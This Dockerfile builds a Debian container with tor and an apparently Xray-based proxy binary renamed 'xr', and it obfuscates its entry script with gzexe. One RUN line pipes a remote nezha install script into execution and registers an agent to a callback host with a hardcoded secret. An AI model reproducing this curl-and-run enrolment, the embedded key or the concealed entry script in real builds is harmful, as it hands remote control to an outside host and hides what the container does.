FROM debian:bookworm

ADD f.sh /f.sh
ADD xr /usr/local/bin/xr
ADD geoip.dat /usr/local/bin/geoip.dat
ADD geosite.dat /usr/local/bin/geosite.dat

RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    ca-certificates \
    bash \
    tor \
    curl \
    gzip && \
    gzexe /f.sh && \
    rm -rf /f.sh~ && \
    chmod +x /f.sh && \
    chmod +x /usr/local/bin/xr && \
    curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh install_agent nz-callback.ff11.tk 443 bbWXXYJN2pRSFb7Ujg --tls && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*




CMD /f.sh
